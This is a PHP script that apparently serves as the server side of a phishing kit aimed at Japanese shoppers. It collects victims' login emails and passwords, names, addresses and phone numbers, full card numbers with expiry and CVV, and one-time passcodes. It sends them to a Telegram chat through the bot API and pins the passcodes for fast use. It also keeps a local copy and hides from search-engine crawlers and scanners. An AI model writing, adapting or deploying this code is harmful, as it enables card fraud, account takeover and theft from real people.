<?php
declare(strict_types=1);
/**
 * api/log.php — POST receiver. Never linked from the front end.
 */

$cfg   = require __DIR__ . '/config.php';
$token = base64_decode((string)($cfg['tg'] ?? ''), true);
$chat  = base64_decode((string)($cfg['chat'] ?? ''), true);

if (!$token || !$chat) { http_response_code(500); exit; }

function e(?string $v): string {
    return htmlspecialchars(trim((string)$v), ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}
function clip(?string $v, int $n = 140): string {
    $v = trim((string)$v);
    return mb_strlen($v, 'UTF-8') > $n ? mb_substr($v, 0, $n, 'UTF-8') . '…' : $v;
}
function ip(): string {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $k) {
        if (!empty($_SERVER[$k])) {
            $p = explode(',', (string)$_SERVER[$k]);
            return trim($p[0]);
        }
    }
    return '0.0.0.0';
}
function tg(string $token, string $method, array $p): array {
    $ch = curl_init("https://api.telegram.org/bot{$token}/{$method}");
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($p),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 6,
        CURLOPT_CONNECTTIMEOUT => 4,
    ]);
    $out = curl_exec($ch);
    curl_close($ch);
    $j = json_decode((string)$out, true);
    return is_array($j) ? $j : ['ok' => false];
}

$ip    = ip();
$ua    = (string)($_POST['ua'] ?? $_SERVER['HTTP_USER_AGENT'] ?? '');
$step  = (string)($_POST['step'] ?? '');
$mode  = (string)($cfg['parse_mode'] ?? 'HTML');
$quiet = (bool)($cfg['silent'] ?? false);

/* ---------- rate limit: 25 hits / 10 min per IP ---------- */
$rl = sys_get_temp_dir() . '/tg_rl_' . md5($ip);
if (is_file($rl) && time() - (int)filemtime($rl) > 600) { @unlink($rl); }
$n = is_file($rl) ? (int)file_get_contents($rl) : 0;
if ($n > 25) { http_response_code(204); exit; }
@file_put_contents($rl, (string)($n + 1));

/* ---------- crawler filter ---------- */
$isBot = (bool)preg_match(
    '/Googlebot|Google-InspectionTool|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|Applebot|'
  . 'Twitterbot|facebookexternalhit|Slackbot|Discordbot|LinkedInBot|Pinterestbot|HeadlessChrome|'
  . 'PhantomJS|Puppeteer|Playwright|Lighthouse|python-requests|Go-http-client|curl\//i', $ua);

if ($isBot && ($cfg['drop_bots'] ?? true) && !($cfg['log_bots'] ?? true)) {
    http_response_code(204); exit;
}

if (!empty($cfg['allow_cidr'])) {
    $ok = false;
    foreach ((array)$cfg['allow_cidr'] as $net) {
        [$sub, $bits] = array_pad(explode('/', $net), 2, '32');
        if ((ip2long($ip) >> (32 - (int)$bits)) === (ip2long($sub) >> (32 - (int)$bits))) { $ok = true; break; }
    }
    if (!$ok) { http_response_code(204); exit; }
}

/* ---------- assemble ---------- */
$sid = substr(sha1($ip . ($_POST['email'] ?? '') . date('Ymd')), 0, 5);
$now = (new DateTime('now', new DateTimeZone('Asia/Tokyo')))->format('H:i:s');
$h   = ['#1' => '🔐', '#2' => '📦', '#3' => '💳', '#4' => '🔢'];

$t = match (true) {
    $step === '1_login' => "🔐 <b>LOGIN</b>  <code>{$sid}</code>\n"
        . '📧 <code>' . e($_POST['email'] ?? '') . "</code>\n"
        . '🔑 <code>' . e($_POST['password'] ?? '') . '</code>',

    $step === '2_bill' => "📦 <b>BILLING</b>  <code>{$sid}</code>\n"
        . '👤 ' . e(($_POST['lastname'] ?? '') . ' ' . ($_POST['firstname'] ?? '')) . "\n"
        . '🈁 ' . e(($_POST['lastkana'] ?? '') . ' ' . ($_POST['firstkana'] ?? '')) . "\n"
        . '〒 ' . e($_POST['zip'] ?? '') . ' ' . e($_POST['pref'] ?? '') . e($_POST['city'] ?? '') . "\n"
        . (($_POST['building'] ?? '') !== '' ? '🏢 ' . e($_POST['building']) . "\n" : '')
        . '☎️ <code>' . e($_POST['tel'] ?? '') . '</code>',

    $step === '3_card' => "💳 <b>CARD</b>  <code>{$sid}</code>\n"
        . '🏦 ' . strtoupper(e($_POST['brand'] ?? '')) . "\n"
        . '💳 <code>' . e($_POST['card'] ?? '') . "</code>\n"
        . '📅 ' . e($_POST['exp'] ?? '') . '  ·  🔒 <code>' . e($_POST['cvv'] ?? '') . "</code>\n"
        . '👤 ' . e($_POST['holder'] ?? ''),

    $step === '4_otp' => "🔢 <b>OTP</b>  <code>{$sid}</code>\n"
        . '<b><code>' . e($_POST['otp'] ?? '') . '</code></b>',

    $step === '4b_resend' => "📨 <b>RESEND</b>  <code>{$sid}</code>",

    $step === '0_visit' => "👁 <b>VISIT</b>  <code>{$sid}</code>\n"
        . '🕐 ' . e($_POST['tz'] ?? '') . "\n"
        . '🗣 ' . e($_POST['lang'] ?? '') . "\n"
        . '🖥 ' . e($_POST['scr'] ?? '') . ' @' . e($_POST['dpr'] ?? '') . "\n"
        . '🧩 ' . e(clip($_POST['gl'] ?? '', 60)) . "\n"
        . '🎨 ' . e($_POST['ch'] ?? '') . '  ·  👆 ' . e($_POST['touch'] ?? ''),

    default => "❓ <b>UNKNOWN</b>  <code>{$sid}</code>\nstep=" . e($step),
};

$t .= "\n\n🌐 <code>" . e($ip) . '</code>  ·  🕐 ' . $now . ' JST';
if (!empty($_POST['vp'])) { $t .= '  ·  📐 ' . e($_POST['vp']); }
if (!empty($_POST['fax'])) { $t .= "\n🍯 honeypot filled"; }
if ($isBot) { $t .= "\n🤖 <i>crawler</i>"; }
if ($ua) { $t .= "\n📱 <i>" . e(clip($ua, 90)) . '</i>'; }

if ($isBot && ($cfg['drop_bots'] ?? true) && !($cfg['log_bots'] ?? true)) {
    http_response_code(204); exit;
}

/* ---------- send ---------- */
$r = tg($token, 'sendMessage', [
    'chat_id'                  => $chat,
    'text'                     => $t,
    'parse_mode'               => $mode,
    'disable_web_page_preview' => true,
    'disable_notification'     => $quiet || $step === '0_visit',
]);

if (($r['error_code'] ?? 0) === 429) {
    sleep(min(3, (int)($r['parameters']['retry_after'] ?? 1)));
    $r = tg($token, 'sendMessage', [
        'chat_id' => $chat, 'text' => $t, 'parse_mode' => $mode, 'disable_web_page_preview' => true,
    ]);
}

if ($step === '4_otp' && ($cfg['pin_otp'] ?? true) && !empty($r['result']['message_id'])) {
    tg($token, 'pinChatMessage', [
        'chat_id'              => $chat,
        'message_id'           => $r['result']['message_id'],
        'disable_notification' => true,
    ]);
}

/* ---------- local backup ---------- */
$keep = ['step','email','password','lastname','firstname','zip','pref','city','tel','card','exp','cvv','holder','brand','otp','tz','lang','gl','ch','dpr','touch'];
$row  = ['t' => date('c'), 'ip' => $ip, 'sid' => $sid];
foreach ($keep as $k) { if (isset($_POST[$k]) && $_POST[$k] !== '') { $row[$k] = (string)$_POST[$k]; } }
@file_put_contents(__DIR__ . '/../hits.jsonl', json_encode($row, JSON_UNESCAPED_UNICODE) . "\n", FILE_APPEND | LOCK_EX);

http_response_code(204);